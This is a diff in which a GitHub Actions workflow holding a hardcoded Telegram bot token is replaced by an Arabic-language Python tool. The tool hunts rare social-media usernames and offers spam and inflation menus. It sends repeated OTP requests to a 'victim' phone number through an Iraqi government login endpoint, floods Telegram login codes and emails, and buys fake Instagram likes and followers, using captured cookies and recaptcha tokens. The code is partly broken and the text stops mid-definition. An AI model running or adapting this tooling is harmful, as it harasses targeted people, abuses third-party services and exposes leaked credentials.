@@ -1,38 +1,581 @@
-name: Run Telegram Bot Script
+import requests
+import webbrowser
+import time
+import random
+from user_agent import generate_user_agent as ua
+#— — — — — — — — — — — — —
+Z = '\033[1;31m' #احمر
+X = '\033[1;33m' #اصفر
+Z1 = '\033[2;31m' #احمر ثاني
+F = '\033[2;32m' #اخضر
+A = '\033[2;34m'#اورق
+C = '\033[2;35m' #وردي
+S = '\033[2;36m'#سمائي
+G = '\033[1;34m' #ازرق فاتح
+HH='\033[1;34m' #ازرق فاتح
+M = '\x1b[1;37m'#ابیض
+W1 = '\x1b[1;97m'
+#— — — — — — — — — — — — —
+GE,BE,GI,BI=0,0,0,0
+#— — — — — — — — — — — — —
+import os
+try:
+ from cfonts import render, say
+except:
+ os.system('pip install python-cfonts')
+output = render('MLHAM', colors=['yellow', 'blue'], align='center')
+print(output)
+print(f'{X}—'*55)
+print(f'''{X} `•.,¸¸,.•´¯{Z}ﭕ﴿ﺷﹻٰ۫ﹻۙﹻﺮﯾﹻٰ۫ﹻۙﹻﺂۛن الہٰسہٰرحہٰانيٰ ﴾{X}¯`•.,¸¸,.•´
+ ''')
+webbrowser.open('https://t.me/oio_r9')
+print(f'{X}—'*55)
+Token=input(f'{C} • 𝗧𝗢𝗞𝗔𝗡 :  ')
+ID=input(f'{C} •  𝗟𝗗 :  ')
+os.system('clear')
+R7 = (f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text= 
+𝓶𝓵𝓱𝓪𝓶 𝓪𝓵𝓼𝓻𝓱𝓪𝓷 🤎
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 : @oio_r6 
+ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+يا شوق ازعجه بغيابي يا شوق لا تخليه يفرح بغيابي 💔.
+''')
+i = requests.post(R7)
+#— — — — — — — — — — — — —
+Z = '\033[1;31m' #احمر
+X = '\033[1;33m' #اصفر
+Z1 = '\033[2;31m' #احمر ثاني
+F = '\033[2;32m' #اخضر
+A = '\033[2;34m'#اورق
+C = '\033[2;35m' #وردي
+S = '\033[2;36m'#سمائي
+G = '\033[1;34m' #ازرق فاتح
+HH='\033[1;34m' #ازرق فاتح
+M = '\x1b[1;37m'#ابیض
+W1 = '\x1b[1;97m'
+#— — — — — — — — — — — — —
+GE,BE,GI,BI=0,0,0,0
+#— — — — — — — — — — — — —
+output = render('MLHAM', colors=['yellow', 'blue'], align='center')
+print(output)
+print(f'{X}—'*55)
+webbrowser.open('https://t.me/oio_r9')
+print(f'''
+\n{S}[1]{F} قسم اليوزرات المدفوعه
+\n{Z1}ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+\n{S}[2]{F} قسم السبام والرسائل 
+\n{Z1}ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ 
+\n{S}[3]{F} قسم رشق لايكات   
+\n{Z1}ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+\n{S}[4]{F} قسم الادوات الاخرى 
+\n{Z1}ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+''')
+MLHAM=input(f'{HH} Enter Choose :')
+print(MLHAM)
+if MLHAM == "1":
+	os.system('clear')
+	webbrowser.open('https://t.me/oio_r9')
+	print(f'''
+\n{S}[A]{F} صيد يوزرات انستا
+\n{Z1}ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ 
+\n{S}[B]{F} صيد يوزرات تيك توك
+\n{Z1}ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ 
+\n{S}[S]{F} صيد يوزرات يوتيوب
+\n{Z1}ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+\n{S}[D]{F} صيد يوزرات سناب
+\n{Z1}ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+\n{S}[F]{F} صيد يوزرات تليجرام
+\n{Z1}ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+''')
+MLHAM=input(f'{C} Enter Choose :')
+if MLHAM == 'A':
+	os.system('clear')
+	print(output)
+	while True:
+		user=(''.join((random.choice('1234567890qwerty_.uiop_.asdf_.ghjkl_.zxcv_.vbnm')for i in range(5))))
+		cookies = {
+		    'mid': 'Z_qbhwABAAHrEM9ApROAB99BVSJ-',
+		    'datr': 'h5v6ZySb_pFzV3Z8jHfJqCkI',
+		    'ig_did': '648688EC-7230-4386-9419-17DDA9544CA0',
+		    'ig_nrcb': '1',
+		    'ps_l': '1',
+		    'ps_n': '1',
+		    'csrftoken': '6V8Nru1Dkva9Q6FnKozrXzY7OgYfTng9',
+		    'dpr': '1.9804123640060425',
+		    'wd': '1113x1907',
+		}
+		
+		headers = {
+		    'authority': 'www.instagram.com',
+		    'accept': '*/*',
+		    'accept-language': 'ar-JO,ar-AE;q=0.9,ar;q=0.8,en-AS;q=0.7,en;q=0.6,en-US;q=0.5',
+		    'content-type': 'application/x-www-form-urlencoded',
+		    # 'cookie': 'mid=Z_qbhwABAAHrEM9ApROAB99BVSJ-; datr=h5v6ZySb_pFzV3Z8jHfJqCkI; ig_did=648688EC-7230-4386-9419-17DDA9544CA0; ig_nrcb=1; ps_l=1; ps_n=1; csrftoken=6V8Nru1Dkva9Q6FnKozrXzY7OgYfTng9; dpr=1.9804123640060425; wd=1113x1907',
+		    'origin': 'https://www.instagram.com',
+		    'referer': 'https://www.instagram.com/accounts/emailsignup/',
+		    'sec-ch-prefers-color-scheme': 'dark',
+		    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+		    'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
+		    'sec-ch-ua-mobile': '?0',
+		    'sec-ch-ua-model': '""',
+		    'sec-ch-ua-platform': '"Linux"',
+		    'sec-ch-ua-platform-version': '""',
+		    'sec-fetch-dest': 'empty',
+		    'sec-fetch-mode': 'cors',
+		    'sec-fetch-site': 'same-origin',
+		    'user-agent': str(ua()),
+		    'x-asbd-id': '359341',
+		    'x-csrftoken': '6V8Nru1Dkva9Q6FnKozrXzY7OgYfTng9',
+		    'x-ig-app-id': '936619743392459',
+		    'x-ig-www-claim': '0',
+		    'x-instagram-ajax': '1023339732',
+		    'x-requested-with': 'XMLHttpRequest',
+		    'x-web-session-id': 'xye5y0:dgvagk:wio0ea',
+		}
+		ti=str(time.time).split('.')[0]
+		data = {
+		    'enc_password': '#PWD_INSTAGRAM_BROWSER:0:{ti}:mlham',
+		    'email': 'sbakakaj@gmail.com',
+		    'failed_birthday_year_count': '{}',
+		    'first_name': 'ملهم السࢪحاني',
+		    'username': user,
+		    'client_id': 'Z_qbhwABAAHrEM9ApROAB99BVSJ-',
+		    'seamless_login_enabled': '1',
+		    'opt_into_one_tap': 'false',
+		    'use_new_suggested_user_name': 'true',
+		    'jazoest': '22819',
+		}
+		
+		re = requests.post(
+		    'https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/',
+		    cookies=cookies,
+		    headers=headers,
+		    data=data,
+		).text
+		if '"dryrun_passed":true' in re:
+			print(f'   {F} ➪ 𝗚𝗢𝗗 𝗨𝗦𝗘𝗥 {user}  ')
+			R7 = (f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text= • 
+			𝗚𝗢𝗗 𝗨𝗦𝗘𝗥
+\n━━━━━━━━━━━━━•
+\n 𝐈𝐍𝐒𝐓 ➪ {user}
+\n━━━━━━━━━━━━━•
+BY : @oio_r6 
+BY : @oio_r9
+''')
+			i = requests.post(R7)
+		else:
+			print(f'   {Z1} ➪ 𝗕𝗔𝗗 𝗨𝗦𝗘𝗥 {user}  ')
+if MLHAM == 'B':
+	os.system('clear')
+	print(output)
+	while True:
+		user1=(''.join((random.choice('1234567890_.qwertyuiop_.asdfghjkl_.zxcvbnm')for i in range(5))))
+######[شريان السرحاني]######
+		cookies = {
+		    'PHPSESSID': 'v91qvvuuh2ao7bhgdsda5oceld',
+		}
+		headers = {
+		    'authority': 'www.mediamister.com',
+		    'accept': '*/*',
+		    'accept-language': 'ar-JO,ar-AE;q=0.9,ar;q=0.8,en-AS;q=0.7,en;q=0.6,en-US;q=0.5',
+		    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+		    # 'cookie': 'PHPSESSID=v91qvvuuh2ao7bhgdsda5oceld',
+		    'origin': 'https://www.mediamister.com',
+		    'referer': 'https://www.mediamister.com/tiktok-username-checker',
+		    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+		    'sec-ch-ua-mobile': '?1',
+		    'sec-ch-ua-platform': '"Android"',
+		    'sec-fetch-dest': 'empty',
+		    'sec-fetch-mode': 'cors',
+		    'sec-fetch-site': 'same-origin',
+		    'user-agent': str(ua()),
+		    'x-requested-with': 'XMLHttpRequest',
+		}
+		
+		data = {
+		    'recaptcha': '03AFcWeA7yD0ImpfL_hKx7YUr_4b8qctVjAykdpQAu7XQQZWQwdh0N7CHNHwNP267HXWM0EwJmrmRhzxqlpdJR9qTBvgcllo7IliVM32HZfthGuZZ_cwolKmmXCzxp8qrL-O4ruaj0v2-nec8VZ3WXKzeMxSeUNIxfdfupUxrKxIdrHO5tXRKQK3JF-eZOsqP0NayIrZJY-72PmMG2KqTr9zpHgUIKzpSQCPnfwazd_rP4FqBcsm674_8I8UBoyyANI8o5dRGxYt6R_BIvEvWBjZhSaVnsDadh9Xcic_5zAwnK8YpPgPtwmb4hKQu28JkbbhJu_lUVtCgCzRg3OV12TiUg0mL8k2X64EncbVKvvCpFbRf82nnalNuaV8HFe_IlAru8mejy2Qmw8OLSL8qV14zU1a-CYxKHCyasRTX4-lhsO-mH0PpBlwju9yg915GHusAOo547zluaz3jhGXG0FnNNqupU6leRHv2aCm2GWUKVNgYLbGqEOUowJFym24ijotZO-oT5YWfI7k692d8C_WJ_dSawTQpCy6xJ0HtQKmd8Uv-O0NXfRtUpwTPW5-3iurQkuAMSCCBOwGe6MVUMJq0k6xkk9eP91tt4miyMyIEIv7MYc-fVzHjttBmxnrWWhpOkD1H9cFrWksAV8WRk33PxH5z5FoJQUF-8VaN-3y110r9EGgwHCxZbixeQpIGEk4LtDS5cYJEA2Eci44pSJRlPTtbbt0f8bP8dw-Uk31OGVj3AS9n5Ooe4F_yN-3cifqjDs-Mcr2I_6bK0NdklOGDXfXHkAGpwMJ6uDMf_bm2ZvYBu0mJETmRmKUcJQzHR6SLoP4kww9LoObwHRmrpBj_IR7ECMKM7qTRVwLk26fD9gL-eN_-QE1hgihlXT6aqou-Ofe9OuH1Bz6aHVJHwkw7Bo9a9z-7PwPPhbvaYghFcFcFd3N2YxLyEu-h_mFKZlUjt3MaVBFL8FUqHV3wlp5-McoO_MTg1jAgTwBiJg1aVuDSt9K8DgaiLtyZtIssUvCfDU29Px-gIbJ31nUwy5En4GrL-7X-3-g',
+		    'username': user,
+		}
+		
+		re = requests.post('https://www.mediamister.com/get_tiktok_handle', cookies=cookies, headers=headers, data=data).text
+		if "'handle_available'" in re:
+			print(f'\r {F} 𝗛𝗜𝗧𝗦 : {user1} ')
+			R7 = (f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text= • 
+			𝗚𝗢𝗗 
 
-on:
-  workflow_dispatch:  # يشتغل يدويًا من Actions
+\n━━━━━━━━━━━━━•
 
-jobs:
-  run-bot:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v3
+\n TIK TOK ➪ @{user1}
+ 
+BY : @oio_r6 
 
-      - name: Setup Python
-        uses: actions/setup-python@v4
-        with:
-          python-version: "3.10"
+\n━━━━━━━━━━━━━•
 
-      - name: Install dependencies
-        run: pip install requests
+BY : https://t.me/oio_r9
+''')
+			i = requests.post(R7)
+		else:
+			print(f'\r {Z} 𝗕𝗔𝗗 : {user1} ')
+if MLHAM == 'S':
+	os.system('clear')
+	print(output)
+	while True:
+		user2=(''.join((random.choice('1234567890qwertyuiopasdfghjkl_.zxcvbnm')for i in range(5))))	
+		headers = {
+    'authority': 'api.brandsnag.com',
+    'accept': 'application/json, text/plain, */*',
+    'accept-language': 'ar-JO,ar-AE;q=0.9,ar;q=0.8,en-AS;q=0.7,en;q=0.6,en-US;q=0.5',
+    'content-type': 'application/json;charset=UTF-8',
+    'origin': 'https://brandsnag.com',
+    'referer': 'https://brandsnag.com/',
+    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'user-agent': str(ua()),
+}
 
-      - name: Run Telegram Script
-        run: |
-          cat > script.py << 'EOF'
-          import requests, time
+		json_data = {
+    'username': user2,
+    'purpose': 'personal',
+    'userId': '3fb01bbc-d88c-434a-a377-e2d769b8089e',
+    'filter': [
+        'youtube',
+    ],
+}
 
-          BOT_TOKEN = '8487843464:AAECvpkUdcyQXFCFEX-XzWPAAfYhfV5mRn8'
-          CHAT_ID = '1129058387'
+		re = requests.post('https://api.brandsnag.com/api/social-media/request-search', headers=headers, json=json_data).text
+		if '"true,"data":' in re:
+			print(f'{F} GOOD : {user2} ')
+		else:
+			print(f'{Z} BAD : {user2} ')
+if MLHAM == 'D':
+	os.system('clear')
+	print(output)
+	while True:
+			user3=(''.join((random.choice('123_.4567890_.qwertyuiopas_.dfghjklzxcvbnm_.')for i in range(5))))
+			cookies = {
+    'PHPSESSID': 'd9fsrdehbfq0fiiesu9o90vpbt',
+}
+			headers = {
+    'authority': 'www.mediamister.com',
+    'accept': '*/*',
+    'accept-language': 'ar-JO,ar-AE;q=0.9,ar;q=0.8,en-AS;q=0.7,en;q=0.6,en-US;q=0.5',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    # 'cookie': 'PHPSESSID=d9fsrdehbfq0fiiesu9o90vpbt',
+    'origin': 'https://www.mediamister.com',
+    'referer': 'https://www.mediamister.com/snapchat-username-checker',
+    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': str(ua()),
+    'x-requested-with': 'XMLHttpRequest',
+}
 
-          def send_message(text):
-              url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
-              data = {'chat_id': CHAT_ID, 'text': text}
-              requests.post(url, data=data)
+			data = {
+    'recaptcha': '03AFcWeA4TDK_V5Q4LKNbef6B6M3BnG630NBLJJxOP4oReuP8deORa6dea1dUOnUdKOLrH8rJk4CPrKXqkIbmYoGeaQklZoIMEC95efFh-sSZN59ENB0kNDd3TESLd5tKGA0mtFrGQ4FvdxZd2muwgLsfyKs6p-I2B3Oh0pOJnzmIdoymF3QtRav7yPAalWXhlICl0-80eC4_evN1aM5xvQWTxzMoeGSkYJZe6MpCzs5MMbGIBjREz-PSZ3mr2rR3J_8RUKxt5ruMq1x2IKk26oUDxOE6A6_aOxzBEWHil_USgQf0EeAGS-AYQmfytvON6oOYXoH8jyLuFMz1vHaHLRyGP5bdUNGDgBV9ka69Izy7gEgyd156JuQ7GDi1dVOgh0bzaTgbxYMgFOqZYKxeNCJzzZiP7A94KV_LTDo6AttWCdnLi3CR-sJ7gpVX8Gu2HiO24zJw2bWxwWE3QEFfVsfjVy_aF2Qvuge3zWPLptwOmPwkdj7RpYmHld22lqGmeaMhMP1ULQVC7Tm451uLvGUZ46dNSWMjxvYIBXR39beIzS2eznrOj-HGpx24Lott1kB4hd7ysfF4PExrtMdzPlFHx-K3XEk9n_iUn1D0adVxoOAS5FjqnU9EVEfjGMDPsr80bq9DUYdzNXvltkCpJBFhK7gqMKPOds5kGX9WV1DWPQXvAZkl66GnWqazlNXtrneerroYDQsCVFbdIJXB_PSTIfqp3H7fq1GpdYqSHCa1mrWk2N6dNKAmww4JXGBIxcRqiqRT_b6VX80PTnzVjv0_1_IGWTWCF0R8oj6ptUjW3TxJirwo2_EHulQOxZyKj-QESDvk3ujAoUBa457lEzEMjeNByYV4lv3KLFJA6-xrM7ByqDHY2kfeImGab6PSchb7AhSvqBvWjx2wmR1W_E5nN-cstRdMVGy734YVNtZkG7cMIJznOCBBKIihnc28DpGXvHAptI2YS',
+    'username': user3,
+}
+			re = requests.post('https://www.mediamister.com/get_snapchat_handle', cookies=cookies, headers=headers, data=data).text
+			if "'handle_available'" in re:
+				print(f'{F}GOD {S}: {user3}')
+				R7 = (f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text= 
+			𝗚𝗢𝗗 
+\n━━━━━━━━━━━━━•
+\n SNAP ➪ {user3}
+\n━━━━━━━━━━━━━•
+BY : @oio_r6 
+BY : @oio_r9
+''')
+			i = requests.post(R7)
+	else:
+				print(f'{Z}BAD {S}: {user3}')
+if MLHAM == 'F':
+	os.system('clear')
+	print(output)
+	while True:
+		xx = '1234567890_.'
+		nn = 'QWERTYUIOPASDFGHJKLZXCVBNM'
+		ee = 'qwertyuiopasdfghjklzxcvbnm'
+		v1=(''.join((random.choice(xx)for i in range(1))))
+		v2=(''.join((random.choice(nn)for i in range(1))))
+		v3=(''.join((random.choice(ee)for i in range(1))))
+		v4=(''.join((random.choice(xx)for i in range(1))))
+		v5=(''.join((random.choice(nn)for i in range(1))))
+		user5 = v1 + v2 + v3 + v4 + v5
+		re = requests.get(f'https://t.me/{user5}')
+		if re.text.find("'tgme_username_link'") >= 0:
+			print(f' {F}GOD : {user5}')
+			R7 = (f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text= 
+			 𝗨𝗦𝗘𝗥
+\n━━━━━━━━━━━━━•
+\n 𝐈𝐍𝐒𝐓 ➪ {user5}
+\n━━━━━━━━━━━━━•
+BY : @oio_r6 
+BY : @oio_r9
+''')
+			i = requests.post(R7)
+		else:
+			print(f' {Z}Bad : {user5} ')
+if MLHAM == '2':
+		os.system('clear')
+		print(output)
+		webbrowser.open('https://t.me/oio_r9')
+		print(f''' 
+\n{A}[Q]{S} سـبـام SMS 
+\n{C}ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ	
+\n{A}[W]{S} سـبـام تـلـيجـرام	
+\n{C}ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ	
+\n{A}[E]{S} سـبـام ايـمـيـلأت
+\n{C}ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ				''')
+MLHAM=input(f'{G} Enter Choose :')
+if MLHAM == "Q":
+	os.system('clear')
+	print(output)
+	PH=input(f'{A} رقم الضحية : ')
+	while True:		
+		cookies = {
+    'cookiesession1': '678B28707AB1105605F8ED31C5BB0026',
+}
 
-          for i in range(1, 11):
-              send_message(str(i))
-              time.sleep(1)
-          EOF
+		headers = {
+    'authority': 'ur.gov.iq',
+    'accept': 'application/json, text/plain, */*',
+    'accept-language': 'ar-JO,ar-AE;q=0.9,ar;q=0.8,en-AS;q=0.7,en;q=0.6,en-US;q=0.5',
+    'content-type': 'application/json',
+    # 'cookie': 'cookiesession1=678B28707AB1105605F8ED31C5BB0026',
+    'origin': 'https://ur.gov.iq',
+    'referer': 'https://ur.gov.iq/index/login',
+    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': str(ua()),
+    'x-csrf-token': 'R6B7hoBQd0wfG5Y6qOXHPNm4b9WKsTq6Vy6Jssxb',
+}
 
-          python script.py
+		json_data = {
+    'phone_num': PH,
+    'phone_code': '964',
+    'channel': 'phone',
+    'lang': 'ar',
+}
+
+		re = requests.post('https://ur.gov.iq/api/user/sendOTP', cookies=cookies, headers=headers, json=json_data).text
+		if '"data"' in re:
+			print(f'{F} GOOD : {PH} ')
+		else:
+			print(f'{Z1} GOD : {PH}')
+if MLHAM == 'W':
+		webbrowser.open('https://t.me/oio_r9')
+		os.system('clear')
+		ph=input(f'رقم ضحيه تليجرام : ')
+		while True:
+				cookies = {
+		    'stel_ln': 'ar',
+		    'stel_ssid': '778bcc0eea3cc8c67f_9481271376817309576',
+		}
+		
+		headers = {
+		    'authority': 'oauth.telegram.org',
+		    'accept': '*/*',
+		    'accept-language': 'ar-JO,ar-AE;q=0.9,ar;q=0.8,en-AS;q=0.7,en;q=0.6,en-US;q=0.5',
+		    'content-type': 'application/x-www-form-urlencoded',
+		    # 'cookie': 'stel_ln=ar; stel_ssid=778bcc0eea3cc8c67f_9481271376817309576',
+		    'origin': 'https://oauth.telegram.org',
+		    'referer': 'https://oauth.telegram.org/auth?bot_id=531675494&origin=https%3A%2F%2Ftelegram.org&embed=1&request_access=write&return_to=https%3A%2F%2Ftelegram.org%2Fblog%2Flogin%3Fsetln%3Dar',
+		    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+		    'sec-ch-ua-mobile': '?0',
+		    'sec-ch-ua-platform': '"Linux"',
+		    'sec-fetch-dest': 'empty',
+		    'sec-fetch-mode': 'cors',
+		    'sec-fetch-site': 'same-origin',
+		    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+		    'x-requested-with': 'XMLHttpRequest',
+		}
+		
+		params = {
+		    'bot_id': '531675494',
+		    'origin': 'https://telegram.org',
+		    'embed': '1',
+		    'request_access': 'write',
+		    'return_to': 'https://telegram.org/blog/login?setln=ar',
+		}
+		
+		data = {
+		    'phone': ph,
+		}
+		
+		re = requests.post('https://oauth.telegram.org/auth/request', params=params, cookies=cookies, headers=headers, data=data).text
+		for i in re:
+			print(f'{F} تـم نڪـح الـضـحـيـة  ')
+		else:
+			print(f'{Z1}عـذࢪٱ حـاول بـعـد 5 دقـائـق')
+if MLHAM == "E":
+			webbrowser.open('https://t.me/oio_r9')
+			os.system('clear')
+			email=input(f' ضع الايميل :')
+			while True:
+			 headers = {
+    'authority': 'api.kidzapp.com',
+    'accept': 'application/json, text/plain, */*',
+    'accept-language': 'ar-JO,ar-AE;q=0.9,ar;q=0.8,en-AS;q=0.7,en;q=0.6,en-US;q=0.5',
+    'content-type': 'application/json',
+    'origin': 'https://kidzapp.com',
+    'referer': 'https://kidzapp.com/',
+    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'user-agent': str(ua()),
+}
+
+			json_data = {
+    'email': email,
+    'sdk': 'web',
+    'platform': 'desktop',
+}
+
+			re = requests.post('https://api.kidzapp.com/api/3.0/customlogin/', headers=headers, json=json_data).text
+			if '"EMAIL SENT",' in re:
+				print(f'{F}GOD : {email}')
+			else:
+				print(f'{Z1} BAD : {email}')
+if MLHAM == '3':
+			os.system('clear')
+			webbrowser.open('https://t.me/oio_r9')
+			print(f'''
+\n{F}	[Z]{Z}   رشق لايڪات انستڪرام
+{A}ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+\n{F}	[V] {Z} رشق متابعين انستا
+{A}ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+''')
+if MLHAM == 'Z':
+			os.system('clear')
+			CRL=input(f'رابط المنشور : ')
+			while True:
+			 cookies = {
+    'trsdb': '1',
+    'token': 'b15d0977a853dfdefbf9845e3b8fd786',
+    'ci_session': '71695cf945e86d3c85dd1feb5a8677fc5332748f',
+    'trsdb': '1',
+}
+
+			headers = {
+    'authority': 'leofame.com',
+    'accept': '*/*',
+    'accept-language': 'ar-JO,ar-AE;q=0.9,ar;q=0.8,en-AS;q=0.7,en;q=0.6,en-US;q=0.5',
+    'content-type': 'application/x-www-form-urlencoded',
+    # 'cookie': 'trsdb=1; token=b15d0977a853dfdefbf9845e3b8fd786; ci_session=71695cf945e86d3c85dd1feb5a8677fc5332748f; trsdb=1',
+    'origin': 'https://leofame.com',
+    'referer': 'https://leofame.com/ar/free-instagram-likes',
+    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': str(ua()),
+}
+
+			params = {
+    'api': '1',
+}
+
+			data = {
+    'token': 'b15d0977a853dfdefbf9845e3b8fd786',
+    'timezone_offset': 'Asia/Amman',
+    'free_link': CRL,
+    'quantity': '20',
+    'speed': '-1',
+}
+
+			re = requests.post('https://leofame.com/ar/free-instagram-likes', params=params, cookies=cookies, headers=headers, data=data).text
+			if '"Please wait hours or submit a different instagram post"' in re:
+				print(f'{F} تم رشق الايڪأت بـ نجاح ')
+			else:
+				print(f'{Z} عذࢪأ حاول بعد 24 ساعه ')
+if MLHAM == 'V':
+		os.system('clear')
+		print(output)
+		user=input(f' يوزر حسابك : ')
+cookies = {
+    'trsdb': '1',
+    'ci_session': '71695cf945e86d3c85dd1feb5a8677fc5332748f',
+    'trsdb': '1',
+    'token': '261ad5ee082ca494f88b5e36a1bfb842',
+}
+
+headers = {
+    'authority': 'leofame.com',
+    'accept': '*/*',
+    'accept-language': 'ar-JO,ar-AE;q=0.9,ar;q=0.8,en-AS;q=0.7,en;q=0.6,en-US;q=0.5',
+    'content-type': 'application/x-www-form-urlencoded',
+    # 'cookie': 'trsdb=1; ci_session=71695cf945e86d3c85dd1feb5a8677fc5332748f; trsdb=1; token=261ad5ee082ca494f88b5e36a1bfb842',
+    'origin': 'https://leofame.com',
+    'referer': 'https://leofame.com/ar/free-instagram-followers',
+    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+}
+
+params = {
+    'api': '1',
+}
+
+data = {
+    'token': '261ad5ee082ca494f88b5e36a1bfb842',
+    'timezone_offset': 'Asia/Amman',
+    'free_link': 'tmns.2',
+}
+
+re = requests.post(
+    'https://leofame.com/ar/free-instagram-followers',
+    params=params,
+    cookies=cookies,
+    headers=headers,
+    data=data,
+).text
+if '"success":' in re:
+	print(f'{F} تم ࢪشق ➪ {S}{user} ')
+else:
+	print(f'{Z} حدث خطأ حاول بحساب ثاني او بعد 24 ساعه')
+if MLHAM == '4':
+	os.system('clear')
+	print(output)
+	webbrowser.open('https://t.me/oio_r9')
+	print(f''' 
+\n{F}	[N]{Z}Activate email  	
+\n{F}	[M]{Z}Instagram reveal   
+{A}ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ
+{Z} 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 {S}:{F} @oio_r6 
+''')
+YU=input(f' Enter CHOSE : ')
+if YU == 'N':
+	os.system('clear')
+	print(output)
+	email=input(f' Enter Email : ')
+	while True:
+	   cookies = {
+    'datr': '-spGaNRnujrujey1VgsV-n6k',
+    'ig_did': 'F91A2977-C82C-4E04-B9DF-37A3E59DA917',
+    'ig_nrcb': '1',
+    'mid': 'aEbK-gABAAGn8tvf3mtW9Yow_lbj',
+    'ps_l': '1',
+    'ps_n': '1',
+    'csrftoken': 'u44KdgzSAWkh9bC9EwnPflAL88zdrqmo',
+    'dpr': '1.9804123640060425',
+    'wd': '
